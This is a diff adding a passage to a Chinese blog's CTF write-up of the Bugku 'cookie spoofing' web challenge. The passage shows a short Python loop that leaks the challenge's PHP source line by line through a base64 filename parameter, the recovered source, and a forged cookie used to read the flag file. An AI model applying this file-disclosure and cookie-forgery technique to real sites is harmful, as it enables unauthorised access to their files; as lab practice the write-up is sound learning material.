@@ -503,6 +503,31 @@
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/O1%24UM%29LIER5PAGC7OFY%29_TN.png"></p>
 <p>还是解释一波脚本吧，首先使用session保持一个会话状态，然后得到返回的响应头中的flag那一条数据。经过第一次base64解密，然后取解密出来的那一串字符串中的‘：’后面的那一串base64加密的数据进行解密，最后发送一个post数据包，打印出文本信息。</p>
 </li>
+<li><p>cookies欺骗</p>
+<p>打开页面，是一大串没有用的字符串(因为尝试解密了N次…)</p>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/8J9PK_S4VX%7DW%29W7U0RRO%25DO.png"></p>
+<p>有注意到filename参数后面跟的是一串base64编码，去解密一下</p>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/8J9PK_S4VX%7DW%29W7U0RRO%25DO.png"></p>
+<p>解密的到keys.txt，应该这是个突破点，访问一下index.php，注意要base64编码，按照它的方式传参。</p>
+<p>index.php经过base64编码后为：aW5kZXgucGhw</p>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/PAAJKTHIOF1TTDZHYHWDZ%7BV.png"></p>
+<p>在源代码中发现有点有用的信息，这时候把视线再转移到另一个参数line。只显示&lt;?php不全，猜测可能是line控制显示的行数</p>
+<p>我们尝试更改line的值</p>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/FQ%5B4IHZ%5BWK82R5C%29FQFGKQ9.png"></p>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/88L4Y%7D0_M%28WV~LM%7BE%2968F%25I.png"></p>
+<p>确认line参数控制显示的行数了，我们写个python脚本跑一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">lines = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(lines):</span><br><span class="line">    url = <span class="string">&quot;http://123.206.87.240:8002/web11/index.php?line=&quot;</span>+str(i)+<span class="string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span></span><br><span class="line">    res = requests.get(url).text</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure>
+
+<p>跑完得到完整的源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])?$_GET[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	$line=<span class="keyword">isset</span>($_GET[<span class="string">&#x27;line&#x27;</span>])?intval($_GET[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($file==<span class="string">&#x27;&#x27;</span>) header(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"></span><br><span class="line">	$file_list = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">	$file_list[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">	$fa = file($file);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $fa[$line];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看来需要传参cookie，并且margin=margin才能访问keys.php文件</p>
+<p>keys.php经过base64编码为：a2V5cy5waHA=</p>
+<p>我们发送一下包</p>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/2~FY~%5BQJ0HS%5B~JJTVR4F%5BDU.png"></p>
+<p>在源码中找到flag啦~</p>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/06ITHFL5I%5D%24GG%7B%7BQZIQ%254TU.png"></p>
+</li>
 </ol>
 ]]></content>
       <tags>
